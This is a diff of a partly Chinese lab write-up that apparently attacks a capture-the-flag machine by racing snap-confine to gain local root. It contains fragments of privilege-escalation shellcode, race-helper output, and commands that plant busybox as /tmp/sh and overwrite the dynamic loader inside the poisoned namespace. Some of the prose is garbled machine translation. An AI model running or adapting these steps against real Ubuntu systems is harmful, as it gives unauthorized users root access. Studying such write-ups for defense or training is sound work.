@@ -687,7 +687,7 @@ void _start(void) {
 						"mov $0x71, %%rax\n"
 						"syscall\n"
 						::: "rax", "rdi", "rsi"
-		);
+					 );
 
 		/* setregid(0, 0) */
 		__asm__ volatile (
@@ -696,10 +696,10 @@ void _start(void) {
 						"mov $0x72, %%rax\n"
 						"syscall\n"
 						::: "rax", "rdi", "rsi"
-		);
+					 );
 
 		/* execve("/tmp/sh", {"/tmp/sh", NULL} ,NULL) */
-		__asm__ volatile(
+		__asm__ volatile (
 						"mov $0x68732f706d742f, %%rax\n"
 						"push %%rax\n"
 						"mov %%rsp, %%rdi\n"
@@ -710,7 +710,7 @@ void _start(void) {
 						"mov $0x3b, %%rax\n"
 						"syscall\n"
 						::: "rax", "rdi", "rsi", "rdx"
-		);
+					 );
 }
 ```
 </details>
@@ -734,51 +734,183 @@ firefox_2404
 jonathan@10.129.18.95's password: 
 payload.so                                           100% 9056   935.2KB/s   00:00    
 ```
-#### 试着把错误也加进去
+#### 执行
 ```
-jonathan@snapped:/proc/4124/cwd$ ls -la 
+jonathan@snapped:/proc/3799/cwd$ ls -al
 total 4
-drwxrwxrwt  2 root root 4096 Apr 11 03:29 .
-drwxr-xr-x 21 root root  540 Apr 11 03:25 ..
-jonathan@snapped:/proc/4124/cwd$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash
-Running as unit: snap.d1775892725.scope; invocation ID: 73f2318ce8d8418f8b458d18c399e08e
-jonathan@snapped:/proc/4124/cwd$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
-cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_gE21im//dev: No such file or directory
-```
-```
-jonathan@snapped:/proc/3517/cwd$ ~/firefox_2404 ~/paylaod.so
+drwxrwxrwt  2 root root 4096 Apr 12 08:14 .
+drwxr-xr-x 21 root root  540 Apr 12 08:10 ..
+jonathan@snapped:/proc/3799/cwd$ ~/firefox_2404 ~/payload.so
 [*] CVE-2026-3888 - firefox 24.04 helper
-[*] CWD: /proc/3517/cwd
+[*] CWD: /proc/3799/cwd
 [*] Setting up .snap and .exchange directiry...
 [*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
 [*] Starting race against snap-confine...
-[*] Reading snap-confine output (PID 5190)...
-<SNIP>
-DEBUG: cannot open path of the original working directory /tmp (deleted)	//snap 把 /tmp 变成了“虚空目录（void dir）
-DEBUG: the process has been placed in the special void directory
-DEBUG: -- snap startup {"stage":"snap-confine to snap-exec", "time":"1775981401.041731"}
-/bin/sh: 1: cannot create /tmp/race_pid.txt: Directory nonexistent
-/bin/sh: 1: cannot create /tmp/race_perms.txt: Directory nonexistent
+[*] Reading snap-confine output (PID 4574)...
+DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1775996144.630157"}
+DEBUG: umask reset, old umask was   02
+DEBUG: security tag: snap.firefox.hook.configure
+DEBUG: executable:   /bin/sh
+DEBUG: confinement:  non-classic
+DEBUG: base snap:    core22
+DEBUG: ruid: 1000, euid: 0, suid: 0
+DEBUG: rgid: 1000, egid: 1000, sgid: 1000
+DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
+DEBUG: apparmor mode is: enforce
+DEBUG: -- snap startup {"stage":"snap-confine mount namespace start", "time":"1775996144.632610"}
+DEBUG: creating lock directory /run/snapd/lock (if missing)
+DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
+DEBUG: opening lock directory /run/snapd/lock
+DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
+DEBUG: opening lock file: /run/snapd/lock/.lock
+DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
+DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
+DEBUG: sanity timeout initialized and set for 30 seconds
+DEBUG: acquiring exclusive lock (scope (global), uid 0)
+DEBUG: sanity timeout reset and disabled
+DEBUG: ensuring that snap mount directory is shared
+DEBUG: unsharing snap namespace directory
+DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
+DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
+DEBUG: releasing lock 5
+DEBUG: opened snap-update-ns executable as file descriptor 5
+DEBUG: opened snap-discard-ns executable as file descriptor 6
+DEBUG: creating lock directory /run/snapd/lock (if missing)
+DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
+DEBUG: opening lock directory /run/snapd/lock
+DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
+DEBUG: opening lock file: /run/snapd/lock/firefox.lock
+DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
+DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
+DEBUG: sanity timeout initialized and set for 30 seconds
+DEBUG: acquiring exclusive lock (scope firefox, uid 0)
+DEBUG: sanity timeout reset and disabled
+DEBUG: initializing mount namespace: firefox
+DEBUG: device cgroup not required due to base core22
+DEBUG: setting up device cgroup, mode "optional"
+DEBUG: libudev has current tags support
+DEBUG: no devices tagged with snap_firefox_hook_configure, skipping device cgroup setup
+DEBUG: forked support process 4575
+DEBUG: block device of snap core22, revision 1564 is 7:1
+DEBUG: changing apparmor hat to mount-namespace-capture-helperDEBUG: joining preserved mount namespace for inspectionDEBUG: 
+sanity timeout initialized and set for 30 seconds
+
+DEBUG: helper process waiting for command
+DEBUG: sanity timeout initialized and set for 30 seconds
+DEBUG: found base snap device 7:1 on /usr
+DEBUG: sanity timeout reset and disabled
+DEBUG: preserved mount is not stale, reusing
+DEBUG: joined preserved mount namespace firefox
+DEBUG: joining preserved per-user mount namespace
+DEBUG: unsharing the mount namespace (per-user)
+DEBUG: sc_setup_user_mounts: firefox
+DEBUG: performing operation: (disabled) use debug build to see details
+DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
+DEBUG: calling snapd tool snap-update-ns
+DEBUG: DEBUG: waiting for snapd tool snap-update-ns to terminate
+requesting changing of apparmor profile on next exec to snap-update-ns.firefox
+logger.go:93: DEBUG: current mount entries
+logger.go:93: DEBUG: desired mount entries (sorted)
+logger.go:93: DEBUG: - /run/user/1000/doc/by-app/snap.firefox /run/user/1000/doc none bind,rw,x-snapd.ignore-missing 0 0
+logger.go:93: DEBUG: desiredIDs: map[/run/user/1000/doc:true]
+logger.go:93: DEBUG: reuse: map[]
+logger.go:93: DEBUG: processing mount entries
+logger.go:93: DEBUG: adding independent entry: /run/user/1000/doc/by-app/snap.firefox /run/user/1000/doc none bind,rw,x-snapd.ignore-missing 0 0
+logger.go:93: DEBUG: all mimics:
+logger.go:93: DEBUG: mount entries ordered as they will be applied
+logger.go:93: DEBUG: - /run/user/1000/doc/by-app/snap.firefox /run/user/1000/doc none bind,rw,x-snapd.ignore-missing 0 0
+logger.go:93: DEBUG: mount name:"/run/user/1000/doc/by-app/snap.firefox" dir:"/run/user/1000/doc" type:"none" opts:MS_BIND unparsed:"" (error: <nil>)
+DEBUG: snap-update-ns finished successfully
+DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
+DEBUG: NOT preserving per-user mount namespace
+DEBUG: releasing lock 7
+DEBUG: sending command 0 to helper process (pid: 4575)
+DEBUG: DEBUG: sanity timeout reset and disabled
+DEBUG: helper process received command 0
+waiting for response from helper
+DEBUG: waiting for the helper process to exit
+DEBUG: helper process exiting
+DEBUG: helper process exited normally
+DEBUG: resetting PATH to values in sync with core snap
+DEBUG: -- snap startup {"stage":"snap-confine mount namespace finish", "time":"1775996144.674663"}
+DEBUG: set_effective_identity uid:1000 (change: yes), gid:1000 (change: yes)
+DEBUG: requesting changing of apparmor profile on next exec to snap.firefox.hook.configure
+DEBUG: ruid: 1000, euid: 1000, suid: 0
+DEBUG: setting capabilities bounding set
+DEBUG: regaining SYS_ADMIN
+DEBUG: loading bpf program for security tag snap.firefox.hook.configure
+DEBUG: read 152 bytes from /var/lib/snapd/seccomp/bpf/global.bin
+DEBUG: clearing SYS_ADMIN
+DEBUG: execv(/bin/sh, /bin/sh...)
+DEBUG:  argv[1] = -c
+DEBUG:  argv[2] = echo $$ > /tmp/race_pid.txt; stat -c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 > /tmp/race_perms.txt 2>&1; sleep 99994
+DEBUG: umask restored to   02
+DEBUG: working directory restored to /tmp
+DEBUG: -- snap startup {"stage":"snap-confine to snap-exec", "time":"1775996144.682770"}
+^C
+jonathan@snapped:/proc/3799/cwd$ ls -la
+total 16
+drwxrwxrwt  3 root     root     4096 Apr 12 08:15 .
+drwxr-xr-x 21 root     root      540 Apr 12 08:10 ..
+-rw-rw-r--  1 jonathan jonathan   14 Apr 12 08:15 race_perms.txt
+-rw-rw-r--  1 jonathan jonathan    5 Apr 12 08:15 race_pid.txt
+drwxr-xr-x  4 jonathan jonathan 4096 Apr 12 08:15 .snap
+jonathan@snapped:/proc/3799/cwd$ ls 
+race_perms.txt  race_pid.txt
+jonathan@snapped:/proc/3799/cwd$ cat race_perms.txt
+root:root 755
+jonathan@snapped:/proc/3799/cwd$ cat race_pid.txt
+cat: race_pid.txt: No such file or directory
 ```
-#### 换个目录
+#### 一下子就看不见了
+#### 又执行了一遍
 ```
-execl(SNAP_CONFINE, "snap-confine",
-								"--base", "core22",
-								"snap.firefox.hook.configure",
-								"/bin/sh", "-c",
-								"echo $$ > /home/jonathan/race_pid.txt; "
-								"stat -c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
-								"> /home/jonathan/race_perms.txt 2>&1; "
-								"sleep 99994",
-								NULL);
-				_exit(1);
+jonathan@snapped:/proc/3799/cwd$ cat race_pid.txt
+4877
 ```
+#### 所以，在执行$ ~/firefox_2404 ~/payload.so 不用ctrl C，然后直接在 terminal 3操作
 #### Step 4 — Destroy cached namespace 
 #### Step 5 — Win the race 
 #### 我们编译并上传了本文末尾包含的helper和有效负载。Snap（攻击者拥有），复制285个真正的库到。通过一个微小的套接字启动带有调试输出的snap限制，检测绑定挂载触发器，然后通过renameat2（RENAME_EXCHANGE）自动交换目录。快照限制简历和以root用户绑定挂载我们的文件。我们得让这个终端一直开着，这样整个过程才能继续，是什么让我们中毒的命名空间存活
 ----------------------------------------------------------------------
 Terminal 3
 ----------------------------------------------------------------------
+```
+jonathan@snapped:~$ PID=$(cat /proc/3796/cwd/race_pid.txt)
+jonathan@snapped:~$ cat /proc/3796/cwd/race_perms/txt
+cat: /proc/3796/cwd/race_perms/txt: No such file or directory
+jonathan@snapped:~$ cd /proc/$PID/root
+jonathan@snapped:/proc/4516/root$ stat -c '%u:%G' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0:root
+jonathan@snapped:/proc/4516/root$ cp /usr/bin/busybox ./tmp/sh
+jonathan@snapped:/proc/4516/root$ cat ~/payload.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+-bash: ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2: Read-only file system
+jonathan@snapped:/proc/4516/root$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
+/usr/lib/snapd/snap-confine: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found (required by /usr/lib/snapd/snap-confine)
+jonathan@snapped:/proc/4516/root$ id
+uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
+```
+#### 不知道咋的
+```
+jonathan@snapped:/proc/4516/root$ ldd /usr/lib/snapd/snap-confine
+	linux-vdso.so.1 (0x00007397b6192000)
+	libudev.so.1 => /lib/x86_64-linux-gnu/libudev.so.1 (0x00007397b6120000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007397b5e00000)
+	libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007397b6113000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007397b6194000)
+jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/lib64/ld-linux-x86-64.so.2
+root:root
+jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/lib/x86_64-linux-gnu/libcap.so.2
+root:root
+jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/lib/x86_64-linux-gnu/libc.so.6
+root:root
+jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/linux-vdso.so.1
+stat: cannot statx 'usr/linux-vdso.so.1': No such file or directory
+jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/lib/x86_64-linux-gnu/libudev.so.1
+root:root
+jonathan@snapped:/proc/4516/root$ cp /usr/bin/busybox ./tmp/sh
+cp: cannot create regular file './tmp/sh': No such file or directory
+```
 #### Step 6 — Overwrite dynamic loader
 #### race_pid.txt 文件中包含内层 shell 的进程 ID（PID）。race_perms.txt 确认了攻击者拥有权限。/proc/$PID/root 暴露了被污染的命名空间的文件系统。busybox 被植入为 /tmp/sh（静态二进制文件，无 ld-linux 依赖），并且 ld-linux-x86-64.so.2 被我们的 shellcode 覆盖。
 #### Step 7 — Trigger root 
